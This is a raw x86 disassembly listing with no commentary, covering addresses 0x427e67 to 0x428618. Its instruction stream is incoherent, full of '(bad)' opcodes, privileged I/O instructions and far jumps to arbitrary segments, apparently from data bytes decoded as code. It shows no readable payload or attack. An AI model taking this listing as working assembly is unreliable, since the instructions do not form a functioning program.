  427e67:	jg     0x427e05
  427e69:	mov    ds:0x7e93c6a0,al
  427e6e:	fisttp WORD PTR [ecx+0x7c]
  427e71:	(bad)  
  427e72:	cmc    
  427e73:	mov    ebp,0x4cff6600
  427e78:	adc    DWORD PTR [esi+0x19b66e82],edx
  427e7e:	sbb    BYTE PTR [ecx],0x70
  427e81:	and    bh,BYTE PTR [esi+0x32c28152]
  427e87:	cmp    DWORD PTR [ebp+0x10],eax
  427e8a:	xlat   BYTE PTR ds:[ebx]
  427e8b:	jno    0x427e12
  427e8d:	js     0x427e75
  427e8f:	xor    al,0x13
  427e91:	clc    
  427e92:	(bad)  
  427e93:	enter  0xfe28,0x33
  427e97:	aas    
  427e98:	lea    edx,[edi-0xc]
  427e9b:	dec    ebx
  427e9c:	sub    BYTE PTR [esi+eax*2+0x70768e91],ah
  427ea3:	jne    0x427e5f
  427ea5:	sub    DWORD PTR [edx-0x57],0xffffff82
  427ea9:	ret    
  427eaa:	adc    al,0x73
  427eac:	das    
  427ead:	jno    0x427ea4
  427eaf:	das    
  427eb0:	rep outs dx,BYTE PTR ds:[esi]
  427eb2:	aaa    
  427eb3:	mov    es,WORD PTR [ecx+esi*2]
  427eb6:	repnz adc cl,BYTE PTR [ecx+0x35]
  427eba:	xchg   esi,eax
  427ebb:	les    ebp,FWORD PTR [ecx-0x3039fb38]
  427ec1:	scas   al,BYTE PTR es:[edi]
  427ec2:	loopne 0x427e6b
  427ec4:	mov    ebp,DWORD PTR [ebx+0xf6bb7f8]
  427eca:	arpl   WORD PTR [ecx],di
  427ecc:	pushf  
  427ecd:	inc    edi
  427ece:	lods   eax,DWORD PTR ds:[esi]
  427ecf:	pop    esi
  427ed0:	lds    edi,FWORD PTR [ecx+0x50e91562]
  427ed6:	pop    ss
  427ed7:	pop    ss
  427ed8:	or     bh,BYTE PTR ss:[edx-0x6a955daf]
  427edf:	hlt    
  427ee0:	into   
  427ee1:	mov    eax,0x45ba3b83
  427ee6:	dec    esp
  427ee7:	ins    BYTE PTR es:[edi],dx
  427ee8:	cmc    
  427ee9:	mov    cl,0x78
  427eeb:	jo     0x427eef
  427eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427eee:	(bad)  
  427eef:	scas   eax,DWORD PTR es:[edi]
  427ef0:	jmp    0x6f68660d
  427ef5:	bound  ecx,QWORD PTR [ebx]
  427ef7:	lock mov eax,ds:0x4b3b156e
  427efd:	jnp    0x427f0a
  427eff:	adc    edx,DWORD PTR [eax]
  427f01:	mov    ebp,0x4d3dc24e
  427f06:	arpl   WORD PTR [eax+0x6c923ba8],sp
  427f0c:	and    eax,DWORD PTR [esi+0x2b72e93e]
  427f12:	fimul  WORD PTR [edi]
  427f14:	ins    DWORD PTR es:[edi],dx
  427f15:	fcomp  DWORD PTR [ecx-0x9628a4e]
  427f1b:	out    dx,eax
  427f1c:	je     0x427ee1
  427f1e:	mov    eax,0xc549c548
  427f23:	mov    ds:0x51c50e9f,eax
  427f28:	mov    cl,0xc8
  427f2a:	mov    ch,0x95
  427f2c:	retf   
  427f2d:	mov    al,BYTE PTR [edi+ebp*4+0xaed58ca]
  427f34:	ins    BYTE PTR es:[edi],dx
  427f35:	popa   
  427f36:	mov    ch,0x11
  427f38:	inc    edx
  427f39:	fisttp QWORD PTR [esi-0x60]
  427f3c:	inc    eax
  427f3d:	fisttp QWORD PTR [ebp+0x75]
  427f40:	cmp    dh,dl
  427f42:	imul   ebp
  427f44:	cmp    ecx,DWORD PTR [eax]
  427f46:	nop
  427f47:	push   ebx
  427f48:	iret   
  427f49:	aad    0xaa
  427f4b:	pop    eax
  427f4c:	in     al,0xe6
  427f4e:	(bad)  
  427f4f:	neg    BYTE PTR [ebp+ebx*4-0x78]
  427f53:	jge    0x427fb6
  427f55:	data16 aaa 
  427f57:	push   cs
  427f58:	push   edx
  427f59:	scas   eax,DWORD PTR es:[edi]
  427f5a:	jg     0x427fd6
  427f5c:	mov    bl,0xaa
  427f5e:	sbb    esp,DWORD PTR [edi-0x1724c952]
  427f64:	aad    0xcb
  427f66:	dec    eax
  427f67:	and    al,0xb3
  427f69:	pop    eax
  427f6a:	fcomp  QWORD PTR [ebx+eax*8+0x6e]
  427f6e:	push   ds
  427f6f:	mov    cl,BYTE PTR [esi+esi*1-0x73]
  427f73:	mov    BYTE PTR [edx],cl
  427f75:	(bad)  
  427f76:	in     eax,dx
  427f77:	ja     0x427f7f
  427f79:	push   0x1a
  427f7b:	setb   BYTE PTR [edx+0x29]
  427f7f:	sub    bl,ch
  427f81:	clc    
  427f82:	cmc    
  427f83:	cmp    DWORD PTR [ebx],ecx
  427f85:	inc    edi
  427f86:	sub    bl,BYTE PTR [ebp+0x1c]
  427f89:	pop    edi
  427f8a:	outs   dx,DWORD PTR ds:[esi]
  427f8b:	ins    DWORD PTR es:[edi],dx
  427f8c:	stos   DWORD PTR es:[edi],eax
  427f8d:	inc    esi
  427f8e:	xchg   edi,eax
  427f8f:	loopne 0x428008
  427f91:	or     al,0x96
  427f93:	and    bl,BYTE PTR [eax]
  427f95:	data16 jge 0x427f59
  427f98:	loope  0x427f6e
  427f9a:	pop    esi
  427f9b:	jno    0x427f28
  427f9d:	dec    edx
  427f9e:	cmp    al,0x84
  427fa0:	adc    BYTE PTR [edx],bh
  427fa2:	mov    edi,ds
  427fa4:	cdq    
  427fa5:	popa   
  427fa6:	aad    0x35
  427fa8:	clc    
  427fa9:	dec    eax
  427faa:	leave  
  427fab:	icebp  
  427fac:	mov    BYTE PTR [ecx-0x26],al
  427faf:	or     BYTE PTR [ecx-0x7d],0x50
  427fb3:	or     DWORD PTR [esi-0x223920df],eax
  427fb9:	mov    ebx,0x8a05555
  427fbe:	jmp    0xd99f:0x8f00703f
  427fc5:	les    ebp,FWORD PTR [ecx-0x2354f8be]
  427fcb:	test   al,0x65
  427fcd:	push   ds
  427fce:	jl     0x427f87
  427fd0:	addr16 popa 
  427fd2:	and    al,0x61
  427fd4:	popa   
  427fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fd6:	xor    DWORD PTR [eax+0x22],ebp
  427fd9:	mov    bl,0xd8
  427fdb:	jo     0x427f6d
  427fdd:	and    DWORD PTR [ecx-0xacd7a4],edx
  427fe3:	and    eax,0xe5a95604
  427fe8:	scas   eax,DWORD PTR es:[edi]
  427fe9:	fwait
  427fea:	mov    ah,cl
  427fec:	ins    DWORD PTR es:[edi],dx
  427fed:	sub    DWORD PTR [edx],esi
  427fef:	mov    edx,0x961632d5
  427ff4:	fsub   st(5),st
  427ff6:	pusha  
  427ff7:	das    
  427ff8:	sub    DWORD PTR [ebx],eax
  427ffa:	push   edi
  427ffb:	xor    ecx,esi
  427ffd:	sbb    BYTE PTR [eax-0x1],0xa5
  428001:	add    al,0xb8
  428003:	xchg   esp,eax
  428004:	hlt    
  428005:	xchg   esi,eax
  428006:	xchg   BYTE PTR [ecx],dh
  428008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428009:	push   eax
  42800a:	adc    BYTE PTR [ebx+0x7e],ch
  42800d:	pop    ds
  42800e:	cmp    edi,DWORD PTR [ebx+0x21]
  428011:	dec    eax
  428012:	call   0xb00878e
  428017:	and    ebp,edx
  428019:	xor    edx,0xfffffff0
  42801c:	ret    
  42801d:	lods   eax,DWORD PTR ds:[esi]
  42801e:	in     eax,0xcc
  428020:	fcomp  st(6)
  428022:	arpl   WORD PTR [edx-0x78],sp
  428025:	add    esp,ebx
  428027:	dec    ebp
  428028:	push   es
  428029:	loopne 0x42807d
  42802b:	std    
  42802c:	std    
  42802d:	out    dx,eax
  42802e:	outs   dx,BYTE PTR ds:[esi]
  42802f:	sbb    bl,ch
  428031:	adc    BYTE PTR [edi+ebx*4-0x35],dh
  428035:	sub    al,0xef
  428037:	mov    al,ds:0x2a927912
  42803c:	and    eax,0xa25e51de
  428041:	sub    bl,BYTE PTR es:[ebp+0x7a640200]
  428048:	jecxz  0x428043
  42804a:	adc    ebp,ebx
  42804c:	cmp    ebp,DWORD PTR gs:[esi-0x719bbb94]
  428053:	sub    bh,BYTE PTR ds:0x86b5b3b8
  428059:	(bad)
  42805d:	add    al,0xbf
  42805f:	aas    
  428060:	sbb    al,cl
  428062:	test   eax,0xa9170464
  428067:	es jl  0x4280d7
  42806a:	and    eax,0xf41b9a84
  42806f:	xor    ah,BYTE PTR [esi]
  428071:	jp     0x42802b
  428073:	xchg   ecx,eax
  428074:	out    0xef,eax
  428076:	inc    ebx
  428077:	call   DWORD PTR [ebp+0x6091174a]
  42807d:	(bad)  
  42807e:	(bad)  
  42807f:	arpl   ax,di
  428081:	pop    esp
  428082:	shl    DWORD PTR [edi+0x0],0x52
  428086:	daa    
  428087:	push   eax
  428088:	mov    esp,0x6ddc6223
  42808d:	or     eax,DWORD PTR [ebx]
  42808f:	xor    BYTE PTR [ebx],ah
  428091:	into   
  428092:	fs mov bl,0x5
  428095:	add    cl,BYTE PTR [edx+0x70922ffe]
  42809b:	das    
  42809c:	cld    
  42809d:	add    BYTE PTR [edi],0xf
  4280a0:	mov    WORD PTR [edi-0x1f],cs
  4280a3:	fs jp  0x4280c2
  4280a6:	jg     0x428121
  4280a8:	jmp    0x9b803ec1
  4280ad:	sar    eax,0xf5
  4280b0:	xchg   ebx,eax
  4280b1:	mov    bh,ah
  4280b3:	and    edi,DWORD PTR [eax-0x43fa6e11]
  4280b9:	jecxz  0x428051
  4280bb:	adc    al,0x22
  4280bd:	std    
  4280be:	and    dh,bh
  4280c0:	in     al,dx
  4280c1:	mov    ebx,0x1331dc05
  4280c6:	lds    eax,FWORD PTR [edx]
  4280c8:	aaa    
  4280c9:	je     0x4280f6
  4280cb:	cmp    eax,DWORD PTR [ebp+0x5c1d5b23]
  4280d1:	jnp    0x428144
  4280d3:	add    edi,ebp
  4280d5:	lahf   
  4280d6:	cdq    
  4280d7:	(bad)  
  4280d8:	pop    edx
  4280d9:	cmp    DWORD PTR [edx],0x71
  4280dc:	aam    0x26
  4280de:	mov    esp,0x7955406b
  4280e3:	aas    
  4280e4:	dec    eax
  4280e5:	js     0x4280df
  4280e7:	fcom   QWORD PTR [edx]
  4280e9:	adc    DWORD PTR [eax],eax
  4280eb:	mov    DWORD PTR [esi],esp
  4280ed:	(bad)  
  4280ee:	sar    esp,1
  4280f0:	pop    esi
  4280f1:	stos   BYTE PTR es:[edi],al
  4280f2:	mov    edi,ecx
  4280f4:	out    dx,al
  4280f5:	es mov edx,0xcf7f0b75
  4280fb:	jnp    0x42815a
  4280fd:	jnp    0x428161
  4280ff:	imul   ebx,ebx,0x3b0979b2
  428105:	fnstsw WORD PTR ds:0xc3a9d85b
  42810b:	jle    0x4280cc
  42810d:	retf   0x66ba
  428110:	or     BYTE PTR [eax+edx*1+0x24b1b8be],ch
  428117:	mov    eax,ds:0x29fe7443
  42811c:	cmp    eax,0xfffffff7
  42811f:	into   
  428120:	fsubr  st,st(0)
  428122:	push   eax
  428123:	ficom  DWORD PTR [edi+0x7e4d51b8]
  428129:	sti    
  42812a:	icebp  
  42812b:	outs   dx,BYTE PTR ds:[esi]
  42812c:	adc    BYTE PTR [edi+0x4e944276],cl
  428132:	cmp    eax,0x7abd0944
  428137:	push   esi
  428138:	sbb    BYTE PTR [edi-0x32],dl
  42813b:	mov    edx,fs
  42813d:	jmp    0xd54b0c8d
  428142:	mov    ch,BYTE PTR [eax+0x1d9b2750]
  428148:	fwait
  428149:	ret    0x3718
  42814c:	pop    edi
  42814d:	jne    0x4281be
  42814f:	pop    ecx
  428150:	lods   al,BYTE PTR ds:[esi]
  428151:	(bad)  
  428152:	adc    BYTE PTR [edx+0x2e5fdfe4],ah
  428158:	jmp    0xe372783b
  42815d:	add    BYTE PTR [ecx-0x590d8e9e],cl
  428163:	mov    ebp,0xe2e9beb8
  428168:	xchg   ecx,eax
  428169:	fsub   DWORD PTR [edx+ebx*1]
  42816c:	in     eax,0xa
  42816e:	xchg   edx,eax
  42816f:	xchg   esi,eax
  428170:	stos   BYTE PTR es:[edi],al
  428171:	js     0x4281ce
  428173:	and    al,0x43
  428175:	ins    BYTE PTR es:[edi],dx
  428176:	and    DWORD PTR [esi-0xd1d1c35],edx
  42817c:	or     dh,BYTE PTR [esi-0x39]
  42817f:	inc    ebx
  428180:	dec    eax
  428181:	out    0x12,eax
  428183:	mov    BYTE PTR [eax],bh
  428185:	add    DWORD PTR [esi+esi*4+0x2a],ebp
  428189:	mov    edx,0x30eece1a
  42818e:	je     0x42818a
  428190:	test   al,0x8a
  428192:	or     DWORD PTR [eax+0x56e2879d],edi
  428198:	mov    ds:0xc6a5a587,al
  42819d:	mov    dh,0xdb
  42819f:	inc    edi
  4281a0:	sbb    ah,BYTE PTR [ebp-0x4378e5d4]
  4281a6:	outs   dx,BYTE PTR ds:[esi]
  4281a7:	lods   al,BYTE PTR ds:[esi]
  4281a8:	(bad)  
  4281a9:	fs mov ah,0x75
  4281ac:	lea    edi,[ecx-0x274ef7b5]
  4281b2:	or     esp,0x4f3367d4
  4281b8:	inc    edx
  4281b9:	mov    WORD PTR [ecx+0x3201f871],gs
  4281bf:	and    eax,edi
  4281c1:	sar    BYTE PTR cs:[eax],cl
  4281c4:	cld    
  4281c5:	pusha  
  4281c6:	and    BYTE PTR ds:0x58e59809,dl
  4281cc:	pop    edi
  4281cd:	mov    esi,0x8aa68c27
  4281d2:	jnp    0x428191
  4281d4:	repz dec edx
  4281d6:	jl     0x4281b9
  4281d8:	test   eax,0x6fb4a0d
  4281dd:	or     bh,BYTE PTR [esp+edi*8]
  4281e0:	out    0x28,eax
  4281e2:	lds    ebp,FWORD PTR [esi+0x5e704d1b]
  4281e8:	push   esp
  4281e9:	fwait
  4281ea:	sub    cl,bl
  4281ec:	push   esp
  4281ed:	pop    ebp
  4281ee:	mov    esp,0x59e354b
  4281f3:	sahf   
  4281f4:	dec    eax
  4281f5:	mov    ch,0x37
  4281f7:	aas    
  4281f8:	cmp    BYTE PTR [edx],dl
  4281fa:	(bad)
  4281fd:	sti    
  4281fe:	pop    edx
  4281ff:	jge    0x428255
  428201:	lds    eax,FWORD PTR [ecx+0x5e]
  428204:	js     0x428280
  428206:	and    BYTE PTR [ebx+0x1c],0x83
  42820a:	mov    eax,0xcd5dbe25
  42820f:	out    dx,eax
  428210:	push   cs
  428211:	ds (bad) 
  428213:	sbb    DWORD PTR [esi-0xf],edi
  428216:	(bad)  
  428217:	mov    edx,0xd3c408c7
  42821c:	and    esp,ecx
  42821e:	dec    edx
  42821f:	fcomp  QWORD PTR [edx+eiz*8-0x5734c825]
  428226:	(bad)  
  428227:	mov    esp,0x4ea893b5
  42822c:	jno    0x428245
  42822e:	retf   0x98fa
  428231:	dec    ebp
  428232:	inc    ebx
  428233:	lds    esp,FWORD PTR [eax-0x64]
  428236:	not    dh
  428238:	push   ecx
  428239:	in     al,dx
  42823a:	inc    esp
  42823b:	ret    0x5e00
  42823e:	int    0x2f
  428240:	mov    edi,0x367c8bc8
  428245:	cmp    DWORD PTR [edx+0x44831d33],ebp
  42824b:	test   DWORD PTR [ebp+0x74ab5b76],ebp
  428251:	mov    ebx,0x54121452
  428256:	out    dx,eax
  428257:	push   esp
  428258:	pop    es
  428259:	and    BYTE PTR ds:0x29116237,dl
  42825f:	dec    esp
  428260:	(bad)  
  428261:	out    0x50,al
  428263:	test   al,0x37
  428265:	xor    eax,0x3669b9fa
  42826a:	xchg   DWORD PTR [edi+0x1c],ecx
  42826d:	aas    
  42826e:	test   edi,ecx
  428270:	push   eax
  428271:	out    0xbf,eax
  428273:	adc    al,0xff
  428276:	int3   
  428277:	push   0x28f1e514
  42827c:	adc    BYTE PTR cs:[ecx],bh
  42827f:	ds pop esi
  428281:	call   0xd9d6768
  428286:	popa   
  428287:	push   ebp
  428288:	jns    0x4282c5
  42828a:	xor    DWORD PTR [esi+0x2be6512a],eax
  428290:	fst    QWORD PTR [esi]
  428292:	(bad)  
  428293:	jmp    0xb85c:0x4173f7c7
  42829a:	dec    edi
  42829b:	mov    esi,0xee5d2f88
  4282a0:	imul   esp,DWORD PTR [ecx+0x29],0x2f125189
  4282a7:	push   ebx
  4282a8:	not    dh
  4282aa:	dec    ebx
  4282ab:	or     dl,bh
  4282ad:	ins    BYTE PTR es:[edi],dx
  4282ae:	add    ebx,DWORD PTR [bp+si+0x20c9]
  4282b3:	loop   0x4282bb
  4282b5:	xchg   esp,eax
  4282b6:	inc    eax
  4282b7:	and    BYTE PTR [ecx+0x79],dh
  4282ba:	dec    ecx
  4282bb:	mov    edi,?
  4282bd:	ds out dx,eax
  4282bf:	out    dx,eax
  4282c0:	jg     0x42825d
  4282c2:	cwde   
  4282c3:	inc    esi
  4282c4:	xchg   esp,eax
  4282c5:	xchg   edi,edi
  4282c7:	xlat   BYTE PTR ds:[ebx]
  4282c8:	imul   ecx,DWORD PTR [ebx+0x78],0x2c
  4282cc:	xchg   edi,eax
  4282cd:	inc    edx
  4282ce:	out    dx,al
  4282cf:	call   0x24cbccdc
  4282d4:	sub    ah,BYTE PTR [ebp+esi*2-0x69]
  4282d8:	aaa    
  4282d9:	pop    edx
  4282da:	sbb    BYTE PTR [ebp-0x66],dh
  4282dd:	pop    eax
  4282de:	daa    
  4282df:	inc    edi
  4282e0:	mov    edi,0x5c59dae1
  4282e5:	sub    dh,BYTE PTR [ecx+esi*8]
  4282e8:	ror    BYTE PTR [ecx-0x6852f1fe],cl
  4282ee:	push   ecx
  4282ef:	mov    esp,0x946a20f6
  4282f4:	bound  ebx,QWORD PTR [ebx]
  4282f6:	outs   dx,BYTE PTR ds:[esi]
  4282f7:	add    BYTE PTR [ecx],dh
  4282f9:	scas   al,BYTE PTR es:[edi]
  4282fa:	lock mov bl,0x95
  4282fd:	sub    ah,BYTE PTR [ecx]
  4282ff:	jb     0x428305
  428301:	mov    bh,0xf5
  428303:	fidivr DWORD PTR [eax+0x2648b55f]
  428309:	pop    esp
  42830a:	cmp    al,0x48
  42830c:	mov    ?,eax
  42830e:	pop    edi
  42830f:	adc    ebp,DWORD PTR [ebp-0x44]
  428312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428313:	pop    ecx
  428314:	inc    esi
  428315:	cmp    edx,ebx
  428317:	ret    
  428318:	repz push ebx
  42831a:	xchg   ebx,eax
  42831b:	push   0x8daab63e
  428320:	adc    BYTE PTR [edx],0xdc
  428323:	and    BYTE PTR [esi],bl
  428325:	add    BYTE PTR [esi-0x36ec6c9],0xd2
  42832c:	adc    bl,dl
  42832e:	sub    al,0xfd
  428330:	and    eax,0x6fbe2f44
  428335:	xchg   ecx,eax
  428336:	cli    
  428337:	xchg   edx,eax
  428338:	into   
  428339:	test   eax,0x4fc929e6
  42833e:	rcr    bh,cl
  428340:	dec    esi
  428341:	cmp    eax,0x4e3abaae
  428346:	imul   ebx,DWORD PTR [esi],0xf9379f42
  42834c:	outs   dx,BYTE PTR ds:[esi]
  42834d:	and    eax,0x1468a582
  428352:	pop    edi
  428353:	push   esi
  428354:	jne    0x42833f
  428356:	jns    0x428380
  428358:	inc    edi
  428359:	mov    ds:0x600b8f4a,eax
  42835e:	and    dl,BYTE PTR [ebx]
  428360:	(bad)  
  428361:	data16 fistp DWORD PTR [edx]
  428364:	dec    eax
  428365:	dec    eax
  428366:	dec    edx
  428367:	jmp    0xafdc:0x4f353706
  42836e:	mov    WORD PTR [eax+0x6b],ds
  428371:	cmp    al,0xd0
  428373:	dec    ecx
  428374:	sub    ch,BYTE PTR [esi+0x7f]
  428377:	push   esp
  428378:	pop    ecx
  428379:	ret    0x6ae3
  42837c:	sub    al,0xc1
  42837e:	jno    0x428342
  428380:	aas    
  428381:	pop    ss
  428382:	mov    ch,0xc3
  428384:	adc    ebp,DWORD PTR [eax-0x120fb879]
  42838a:	in     eax,0xaa
  42838c:	cs add cl,bl
  42838f:	ins    BYTE PTR es:[edi],dx
  428390:	mov    ch,0xa9
  428392:	out    0x3,eax
  428394:	fistp  WORD PTR [esi+0x5c]
  428397:	loop   0x42839a
  428399:	jmp    0xab62:0x57439ae0
  4283a0:	pop    ss
  4283a1:	mov    ds:0xedc2d0ca,al
  4283a6:	sub    ecx,DWORD PTR [ebx]
  4283a8:	test   al,0x46
  4283aa:	ret    
  4283ab:	mov    eax,0x74a935cc
  4283b0:	jmp    0x6092:0xaca4a298
  4283b7:	mov    BYTE PTR [edx+0x1],0x4c
  4283bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283bc:	cmp    BYTE PTR [eax-0x4322146a],0x5c
  4283c3:	fldcw  WORD PTR [esi]
  4283c5:	or     eax,0x815e1b25
  4283ca:	(bad)  
  4283cb:	nop
  4283cc:	fs sbb eax,0xac51fa24
  4283d2:	loopne 0x42843a
  4283d4:	aaa    
  4283d5:	sbb    al,0xb3
  4283d7:	mov    BYTE PTR [edx-0x2ddad767],cl
  4283dd:	xor    eax,esp
  4283df:	pop    ebp
  4283e0:	dec    edi
  4283e1:	hlt    
  4283e2:	pop    esi
  4283e3:	mov    bl,0xe4
  4283e5:	pop    eax
  4283e6:	or     BYTE PTR [ebx],bh
  4283e8:	jecxz  0x42840d
  4283ea:	idiv   BYTE PTR [eax-0x19]
  4283ed:	fs pop ds
  4283ef:	(bad)
  4283f2:	push   edi
  4283f3:	inc    ebp
  4283f4:	push   eax
  4283f5:	stos   DWORD PTR es:[edi],eax
  4283f6:	div    BYTE PTR [eax+0x29]
  4283f9:	aaa    
  4283fa:	or     DWORD PTR [edi-0x394fca53],0x5a3751f5
  428404:	jno    0x428432
  428406:	(bad)  
  428408:	outs   dx,BYTE PTR ds:[esi]
  428409:	outs   dx,BYTE PTR cs:[esi]
  42840b:	arpl   WORD PTR [ebx+0x15],dx
  42840e:	cld    
  42840f:	shl    BYTE PTR [ecx+0x53cc41fe],1
  428415:	retf   0xd0fd
  428418:	jl     0x428424
  42841a:	sti    
  42841b:	das    
  42841c:	lods   eax,DWORD PTR ds:[esi]
  42841d:	and    bl,dh
  42841f:	ins    DWORD PTR es:[edi],dx
  428420:	and    edx,eax
  428422:	and    ah,ah
  428424:	fucomip st,st(2)
  428426:	outs   dx,BYTE PTR ds:[esi]
  428427:	and    edi,DWORD PTR [eax]
  428429:	jno    0x428410
  42842b:	dec    ecx
  42842c:	pusha  
  42842d:	(bad)  
  42842e:	jp     0x4283ec
  428430:	cmp    DWORD PTR [edx],0xe0173ae9
  428436:	shr    DWORD PTR [edx-0x74],cl
  428439:	fcom   QWORD PTR [edi-0x724854ae]
  42843f:	or     ah,BYTE PTR [ecx*2+0x36bdebbc]
  428446:	push   ebx
  428447:	jp     0x428494
  428449:	ficomp WORD PTR [eax+0xd121acd]
  42844f:	jecxz  0x4283ed
  428451:	test   BYTE PTR [ebp-0x202f6ccb],cl
  428457:	in     eax,dx
  428458:	dec    esp
  428459:	cmp    cl,BYTE PTR [edi+0x6037a5f0]
  42845f:	push   cs
  428460:	jle    0x4284d9
  428462:	fs xor eax,0xd200857f
  428468:	jl     0x42845d
  42846a:	(bad)  
  42846b:	pop    esi
  42846c:	push   es
  42846d:	sub    ecx,ebp
  42846f:	mov    ss,WORD PTR ds:[ecx]
  428472:	out    0xab,al
  428474:	jae    0x428435
  428476:	(bad)  
  428477:	push   ebp
  428478:	cmp    DWORD PTR [edi],0xdffbed01
  42847e:	addr16 pop ebx
  428480:	sub    BYTE PTR [ebx],bh
  428482:	xchg   esi,eax
  428483:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  428485:	jnp    0x428407
  428487:	or     al,0xef
  428489:	xor    al,0xd1
  42848b:	arpl   WORD PTR [ebx-0x7996955d],sp
  428491:	icebp  
  428492:	jecxz  0x4284af
  428494:	fwait
  428495:	mov    eax,0x98b075ca
  42849a:	push   cs
  42849b:	loope  0x42843c
  42849d:	and    DWORD PTR [ecx+0x44],0xffffffa3
  4284a1:	stos   BYTE PTR es:[edi],al
  4284a2:	stos   BYTE PTR es:[edi],al
  4284a3:	push   esi
  4284a4:	add    BYTE PTR [edi],cl
  4284a6:	cs mov bh,0xe0
  4284a9:	jo     0x4284f8
  4284ab:	jbe    0x4284fe
  4284ad:	add    eax,0x6bc32557
  4284b2:	std    
  4284b3:	xor    BYTE PTR [esi+0x3f],bh
  4284b6:	fadd   st,st(6)
  4284b8:	movsx  esi,BYTE PTR [edx+0x6]
  4284bc:	rol    DWORD PTR [ebx],0x69
  4284bf:	cmp    bh,bh
  4284c1:	jbe    0x4284cf
  4284c3:	pop    edi
  4284c4:	pop    esp
  4284c5:	call   0x68d06db6
  4284ca:	push   esi
  4284cb:	into   
  4284cc:	xchg   esi,eax
  4284cd:	fmul   QWORD PTR [eax]
  4284cf:	int    0x0
  4284d1:	adc    bl,BYTE PTR [esi]
  4284d3:	adc    dh,BYTE PTR [ebx+eiz*8]
  4284d6:	shl    DWORD PTR ds:0x72ccce02,0x12
  4284dd:	and    ebx,DWORD PTR [eax-0x3fd56766]
  4284e3:	lock add BYTE PTR [ecx],bh
  4284e6:	shl    BYTE PTR [ebx-0x12],0x8
  4284ea:	imul   BYTE PTR [edi-0x2b]
  4284ed:	xor    cl,bh
  4284ef:	mov    dl,0x2c
  4284f1:	pop    edx
  4284f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284f3:	cmp    bl,BYTE PTR [eax+0x4f0e77bd]
  4284f9:	pop    edi
  4284fa:	je     0x428570
  4284fc:	xor    eax,esp
  4284fe:	int    0x8d
  428500:	sub    eax,0x604fcd4c
  428505:	test   eax,0x74d0e162
  42850a:	sbb    al,0xcf
  42850c:	jle    0x428575
  42850e:	adc    DWORD PTR [ebx+0x33e1adce],edi
  428514:	inc    edi
  428515:	(bad)  
  428516:	loop   0x4284f5
  428518:	arpl   WORD PTR [ecx-0x64],sp
  42851b:	fldcw  WORD PTR [eax-0x584a871f]
  428521:	fwait
  428522:	mov    edi,DWORD PTR [esi]
  428524:	pop    ebx
  428525:	scas   al,BYTE PTR es:[edi]
  428526:	jmp    0x428560
  428528:	addr16 push eax
  42852a:	adc    eax,0x10848c78
  42852f:	and    eax,0x62738803
  428534:	out    dx,eax
  428535:	int3   
  428536:	xchg   ebx,eax
  428537:	or     DWORD PTR [ebx+ebp*4+0x38bb26a8],esi
  42853e:	popf   
  42853f:	enter  0xe562,0x58
  428543:	dec    ecx
  428544:	ret    
  428545:	sbb    dl,cl
  428547:	jno    0x428560
  428549:	cmp    al,0x6
  42854b:	shl    dh,1
  42854d:	es pushw ss
  428550:	stos   DWORD PTR es:[edi],eax
  428551:	adc    BYTE PTR [ebx-0x4a],cl
  428554:	test   BYTE PTR [ebx-0x66],dh
  428557:	test   DWORD PTR ds:0x98a41084,ebp
  42855d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42855e:	push   esp
  42855f:	inc    ecx
  428560:	push   ss
  428561:	add    edx,esi
  428563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428564:	mov    DWORD PTR [esi+edi*2],0x28b3dde0
  42856b:	adc    eax,0xc33fa85a
  428570:	jno    0x4285ab
  428572:	dec    ecx
  428573:	sbb    al,0x23
  428575:	int3   
  428576:	jp     0x42852a
  428578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428579:	inc    edx
  42857a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42857b:	push   esp
  42857c:	rcl    edx,1
  42857e:	mov    BYTE PTR [esi+0x58],ch
  428581:	call   0x3b57:0x6a570e25
  428588:	sbb    bl,al
  42858a:	dec    eax
  42858b:	cmp    al,0x2
  42858d:	stos   BYTE PTR es:[edi],al
  42858e:	lods   al,BYTE PTR ds:[esi]
  42858f:	push   0x8b06ab5
  428594:	fist   WORD PTR [edi-0x38]
  428597:	in     eax,dx
  428598:	inc    edi
  428599:	mov    bl,0x51
  42859b:	mov    esp,0x77c1c27f
  4285a0:	sub    bh,BYTE PTR [ebp+0x6c]
  4285a3:	aad    0x38
  4285a5:	xchg   DWORD PTR [edx+eax*1+0x67],edx
  4285a9:	leave  
  4285aa:	call   0xc7381071
  4285af:	mov    ds:0x125db428,al
  4285b4:	xor    ebp,esi
  4285b6:	cld    
  4285b7:	mov    edx,0xaba8dba3
  4285bc:	sub    BYTE PTR [edx+0x6b056689],0x53
  4285c3:	repz cmp BYTE PTR [eax+0x54],cl
  4285c7:	lock sahf 
  4285c9:	adc    WORD PTR [edi-0x6e41b638],sp
  4285d0:	and    DWORD PTR [ebx+0x71],esp
  4285d3:	cmp    bh,BYTE PTR [edx]
  4285d5:	adc    al,0xf6
  4285d7:	sub    BYTE PTR [ecx-0x4b],dh
  4285da:	shl    DWORD PTR [ebp+0x75],cl
  4285dd:	pop    edi
  4285de:	xchg   BYTE PTR [ebp+0x4a],dl
  4285e1:	xchg   ebx,eax
  4285e2:	mov    ebx,0x9e362eec
  4285e7:	scas   eax,DWORD PTR es:[edi]
  4285e8:	ins    DWORD PTR es:[edi],dx
  4285e9:	xchg   edi,eax
  4285ea:	ret    0xdb12
  4285ed:	enter  0xfc3a,0xf8
  4285f1:	or     BYTE PTR [ecx],ah
  4285f3:	push   ss
  4285f4:	fst    DWORD PTR [edi-0x4f]
  4285f7:	fs aaa 
  4285f9:	loope  0x4285b6
  4285fb:	cld    
  4285fc:	and    al,0x8e
  4285fe:	ret    0x494c
  428601:	push   ss
  428602:	push   edi
  428603:	mov    eax,ds:0x248802e4
  428608:	mov    WORD PTR [edx],ds
  42860a:	fistp  WORD PTR [edi]
  42860c:	test   DWORD PTR [edi+0x6762ce32],ebp
  428612:	jge    0x428610
  428614:	add    edx,DWORD PTR [ecx]
  428616:	or     esi,ebx
  428618:	mov    ecx,0x20e90210
